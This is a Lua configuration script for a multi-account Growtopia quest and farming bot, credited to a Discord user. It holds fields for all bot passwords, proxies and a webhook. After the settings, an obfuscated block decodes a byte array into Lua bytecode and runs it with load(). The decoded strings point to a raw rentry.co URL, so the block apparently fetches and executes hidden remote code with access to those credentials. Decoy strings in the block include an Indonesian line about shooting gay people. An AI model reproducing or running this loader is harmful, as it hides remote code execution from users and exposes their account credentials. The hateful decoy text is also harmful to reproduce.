--[ SCRIPT AUTO QUEST GROWPEDIA ]--
--[ SCRIPT MADE By Madang.EXE#6264 ]--
--[ JOIN https://discord.gg/7KBQ77K2gh ]--

GeneralSetting = {
    Password = "", --[ ALL BOT PASSWORD ]--
    BotList = {
        {Growid = "",proxy = ""},
        {Growid = "",proxy = ""},
        {Growid = "",proxy = ""},
    },
    Webhook   = "", --[ WEBHOOK DISCORD LINK ]--
    MessageID = ""  --[ MESSAGE ID ]--
}

pnbDirt = {
    useFeature = false,      --[ true = USING CONFIG / false = NOT USING CONFIG ]--
    world = "",             --[ WORLD DROPPED DIRT ]--
    door  = "",             --[ DOOR ID ]--
    coordinateX = 24,       --[ COORDINATE X FOR BREAKING BLOCK ]--
    coordinateY = 18,       --[ COORDINATE Y FOR BREAKING BLOCK ]--
    dropSeed = {            -- ] CONFIG DROP SEED [ --
        useFeature = true, --[ true = USING CONFIG / false = NOT USING CONFIG ]--
        world = "",         --[ WORLD FOR DROP DIRT SEED ]--
        door  = "",         --[ DOOR ID ]--
        posDrop = 20        --[ FG / BG FOR DROP DIRT SEED ]--
    }
}

pnbCave = {
    useFeature = false,     --[ true = USING CONFIG / false = NOT USING CONFIG ]--
    world = "",             --[ WORLD DROPPED CAVE ]--
    door  = "",             --[ DOOR ID ]--
    coordinateX = 24,       --[ COORDINATE X FOR BREAKING BLOCK ]--
    coordinateY = 18,       --[ COORDINATE Y FOR BREAKING BLOCK ]--
    dropSeed = {            -- ] CONFIG DROP SEED [ --
        useFeature = false, --[ true = USING CONFIG / false = NOT USING CONFIG ]--
        world = "",         --[ WORLD FOR DROP CAVE SEED ]--
        door  = "",         --[ DOOR ID ]--
        posDrop = 16        --[ FG / BG FOR DROP CAVE SEED ]--
    }
}

plantDirt = {
    useFeature = false,   --[ true = USING CONFIG / false = NOT USING CONFIG ]--
    worldTake  = "",      --[ WORLD TAKE SEED ]--
    doorTake   = "",      --[ DOOR ID ]--
    farmList   = {"",""}, --[ FARM FOR PLANT DIRT ]--
    farmDoor   = "",      --[ DOOR ID ALL FARM ]--
}

harvestDirt = {
    useFeature = false,    --[ true = USING CONFIG / false = NOT USING CONFIG ]-- 
    farmList = {"",""},    --[ FARM FOR HARVEST DIRT ]-- 
    doorFarm = "",         --[ DOOR ID ALL FARM ]-- 
    dropDirt = {           -- ] CONFIG DROP DIRT BLOCK [ -- 
        useFeature = false,--[ true = USING CONFIG / false = NOT USING CONFIG ]-- 
        world = "",        --[ WORLD DROP ]-- 
        door  = "",        --[ DOOR ID WORLD DROP ]-- 
        coordinateX = 36,  --[ COORDINATE X FOR DROP ]-- 
        coordinatrY = 21,  --[ COORDINATE Y FOR DROP ]-- 
    }
}

sugarCane = {              --[ HARVEST & PNB & PLANT ]--
    useFeature = false,    --[ true = USING CONFIG / false = NOT USING CONFIG ]--
    farmList = {"","",""}, --[ LIST OF FARM ]--
    doorFarm = ""          --[ DOOR ID ALL FARM ]--
}

fishTank = {               --[ HARVEST & PNB & PLANT ]--
    useFeature = false,    --[ true = USING CONFIG / false = NOT USING CONFIG ]--
    farmList = {"","",""}, --[ LIST OF FARM ]--
    doorFarm = ""          --[ DOOR ID ALL FARM ]--
}

chandelier = {             --[ HARVEST & PNB & PLANT ]--
    useFeature = false,    --[ true = USING CONFIG / false = NOT USING CONFIG ]--
    farmList = {"","",""}, --[ LIST OF FARM ]--
    doorFarm = ""          --[ DOOR ID ALL FARM ]--
}

buySmallSeedPack = {   
    useFeature = false,--[ true = USING CONFIG / false = NOT USING CONFIG ]--
    worldDrop  = "",   --[ WORLD FOR DROP SSP ]--
    doorDrop   = "",   --[ DOOR ID ]--
    posDrop    = 54    --[ FG / BG FOR DROP SSP ]--
}

otherSetting = {
    PlaceFirstWL = true, 
    CollectRange = 2,
    TrashList   = {5742,5744,5746,5748,1406,9204,48,1406,5024,5026,5028, 5032, 5034, 5036, 5038, 5040, 5042, 5044, 7162, 7164,5018,8846,8850,1400},
    TakePickaxe = {
        useFeature = false,
        World = "",
        Door  = ""
    },
    DelaySetting = {
        DelayPlace   = 100,
        DelayPunch   = 180,
        DelayPlant   = 150,
        DelayHarvest = 180,
    },
    CostomDrop = {
        useFeature = false,
        DropList   = {2,3,14,15,954,955,3004,3005,340,341},
        World = "",
        Door  = "",
        CoordinateX = 56,
        CoordinateY = 22
    }
}

claimGrowpedia = true --[ true = CLAIM ALL REWARDS / false = NOT CLAIM REWARDS ]--

--[ Madang.EXE#6264 ]--
key=[[JANGAN DI DESCRYPT]];sgeadzafoamjprhgcqecikylhhiohbsnufjgjhwrcmqyuflxgcudfbffxlzzetjhijghxhqaqufcjubzojgxlyxmqdfjaxfephpdxlrmydklttrsmaceozulsrtmwlfb='om jangan decrypt aku :((';koklljcapnpnammpdhxrofrcvtkvhuttydmmuetbcheviblstijaugafrxkocfcwhwfyuiplwfyzfxvpmydgrlckkebltgjdhygspvgsjcmzmdovjttjzdnnxvxgsffo='Obfuscator Ini Milik ZiGb';rthzczvpkbtqwwdzglzhzpjhsdefwsotbihvkamrhkawelznbjxfihelvzxeeobyvjrybxvwdtcktjvgeewrywbkyvbknkftpxojikfjgsqmgdgdsroadgcudxjuozgb='Kamu Nyari Load?';wdzyspotdlriusfgttobhtmsuiqgngugpsqdeddjgxzgijtjgbwbtrjgkobjnyletnnynbrnlgxyrlhbrhzztywbgkudevmbyvlwpuyquijmyksmgcyxdbohjusghzmw='Saya Tak Ragu Ingin Nembak Gay People';bwhpfpcrpfkbolarfavvymnyusxctxngnexlpwsgkwlaoytqqmudpajupnpgnwkwrhvhwtukezvoqytpaywiakhucwczudwmqgzcxxvjknadyomnhuibcmygyyiavpqq="Soeharto is first indonesian president. Jokowi is seventh indonesian's president, Itadori Yuuji is one of main character in Jujutsu Kaisen Anime, Kento Nanami is Side Character On Jujutsu Kaisen Anime. Lava is 1 of the most dangerous liquid in the world (cap)";xbmlrvqbtgraxswykwkxxryanskjqwgfzkjamuzmnqehuifrfkqjvxnhbjajikcmzuikxkubysavkelcaagfleovjiryafqkttncylljbchmtgjtatwygymiznskyjuy={ 1,288,3,315,364,405,385,372,288,313,435,301,298,314,298,292,296,296,408,374,288,288,288,288,288,288,288,288,288,288,288,328,407,352,289,478,352,355,346,380,373,403,389,402,403,380,353,388,397,393,398,393,403,404,402,385,404,399,402,380,356,389,403,395,404,399,400,380,386,399,404,380,399,386,390,405,403,387,385,404,389,388,380,364,399,385,388,359,400,389,388,393,385,334,396,405,385,421,424,288,288,292,424,299,288,288,288,427,288,288,289,291,289,289,288,419,417,289,288,484,288,291,288,356,288,288,290,356,288,289,289,359,288,289,288,420,292,421,396,399,385,388,292,424,402,389,401,405,389,403,404,292,420,359,357,372,292,452,392,404,404,400,403,346,335,335,402,389,398,404,402,409,334,387,399,335,385,403,398,408,403,392,408,403,408,394,385,403,335,402,385,407,320,417,288,288,288,416,424,290,288,288,288,288,288,288,289,416,416,417,421,383,357,366,374};local nau = 'load'; function vgwmghycsfdjaqxlzjxwgahajcmqtknegxwazmfrrhprehfdqsosfnfqypqxrbkkqgnrvldmknxyinnwdhwkqmlqndrqpagtlsavfhxijpfbwbwleaogxgdqxqlvughd(...) local awzpyvlsooipiaizwqppwirnwtdzcqmbgjkxrvhotpcjcpbrrdutamlsmdafjkzgkrvhuqamixzccjbamazsdnqpkcwjifcjbckfsxulaocekkpkntuojjvewyljijhx='';for ijgoswbulbkpgfsdjgdfjguyhpabpocrktwyhnznsbrmeoomqrjxolzymedbaoiyxymksqkcjznyybjkqfbwiwpcsmnijonrwgccvsvdchaxwtvxjpjfwnchonqsbuwa=1, #xbmlrvqbtgraxswykwkxxryanskjqwgfzkjamuzmnqehuifrfkqjvxnhbjajikcmzuikxkubysavkelcaagfleovjiryafqkttncylljbchmtgjtatwygymiznskyjuy do if ijgoswbulbkpgfsdjgdfjguyhpabpocrktwyhnznsbrmeoomqrjxolzymedbaoiyxymksqkcjznyybjkqfbwiwpcsmnijonrwgccvsvdchaxwtvxjpjfwnchonqsbuwa>3 then awzpyvlsooipiaizwqppwirnwtdzcqmbgjkxrvhotpcjcpbrrdutamlsmdafjkzgkrvhuqamixzccjbamazsdnqpkcwjifcjbckfsxulaocekkpkntuojjvewyljijhx=awzpyvlsooipiaizwqppwirnwtdzcqmbgjkxrvhotpcjcpbrrdutamlsmdafjkzgkrvhuqamixzccjbamazsdnqpkcwjifcjbckfsxulaocekkpkntuojjvewyljijhx.._ENV['\115\116\114\105\110\103']['\99\104\97\114']((xbmlrvqbtgraxswykwkxxryanskjqwgfzkjamuzmnqehuifrfkqjvxnhbjajikcmzuikxkubysavkelcaagfleovjiryafqkttncylljbchmtgjtatwygymiznskyjuy[ijgoswbulbkpgfsdjgdfjguyhpabpocrktwyhnznsbrmeoomqrjxolzymedbaoiyxymksqkcjznyybjkqfbwiwpcsmnijonrwgccvsvdchaxwtvxjpjfwnchonqsbuwa]-xbmlrvqbtgraxswykwkxxryanskjqwgfzkjamuzmnqehuifrfkqjvxnhbjajikcmzuikxkubysavkelcaagfleovjiryafqkttncylljbchmtgjtatwygymiznskyjuy[2]));end end;local tolan = 'loadstring';_ENV[_ENV['\115\116\114\105\110\103']['\99\104\97\114'](koklljcapnpnammpdhxrofrcvtkvhuttydmmuetbcheviblstijaugafrxkocfcwhwfyuiplwfyzfxvpmydgrlckkebltgjdhygspvgsjcmzmdovjttjzdnnxvxgsffo:lower():sub(18,18):byte(),sgeadzafoamjprhgcqecikylhhiohbsnufjgjhwrcmqyuflxgcudfbffxlzzetjhijghxhqaqufcjubzojgxlyxmqdfjaxfephpdxlrmydklttrsmaceozulsrtmwlfb:lower():sub(1,1):byte(),wdzyspotdlriusfgttobhtmsuiqgngugpsqdeddjgxzgijtjgbwbtrjgkobjnyletnnynbrnlgxyrlhbrhzztywbgkudevmbyvlwpuyquijmyksmgcyxdbohjusghzmw:lower():sub(-9,-9):byte(),bwhpfpcrpfkbolarfavvymnyusxctxngnexlpwsgkwlaoytqqmudpajupnpgnwkwrhvhwtukezvoqytpaywiakhucwczudwmqgzcxxvjknadyomnhuibcmygyyiavpqq:lower():sub(21,21):byte())](awzpyvlsooipiaizwqppwirnwtdzcqmbgjkxrvhotpcjcpbrrdutamlsmdafjkzgkrvhuqamixzccjbamazsdnqpkcwjifcjbckfsxulaocekkpkntuojjvewyljijhx)(); end;vgwmghycsfdjaqxlzjxwgahajcmqtknegxwazmfrrhprehfdqsosfnfqypqxrbkkqgnrvldmknxyinnwdhwkqmlqndrqpagtlsavfhxijpfbwbwleaogxgdqxqlvughd(xbmlrvqbtgraxswykwkxxryanskjqwgfzkjamuzmnqehuifrfkqjvxnhbjajikcmzuikxkubysavkelcaagfleovjiryafqkttncylljbchmtgjtatwygymiznskyjuy);
